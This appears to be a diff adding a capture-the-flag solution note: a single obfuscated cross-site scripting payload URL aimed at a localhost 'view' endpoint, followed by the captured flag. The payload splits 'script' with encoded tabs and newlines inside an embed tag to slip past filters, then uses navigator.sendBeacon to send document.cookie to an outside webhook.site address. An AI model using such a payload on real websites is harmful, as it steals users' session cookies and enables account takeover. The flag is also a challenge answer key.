@@ -1,0 +1,6 @@
+Payload ::
+
+http://localhost:3000/view?html=%3Cembed%20id=y%20code=%22/view?ht%0aml=a%253cscri%09pt%253enavigator.sendBeaco%09n(`https://webhook.site/5013188a-89a0-43dc-acbe-56ede6bf187c`,document.cookie)%253c/scr%0dipt%253e%22%20type=%22text/ht%09ml%22%3Eb%3C/embed%3E
+
+Flag ::
+ctf7{you_got_the_real_deal_xd_hehe}
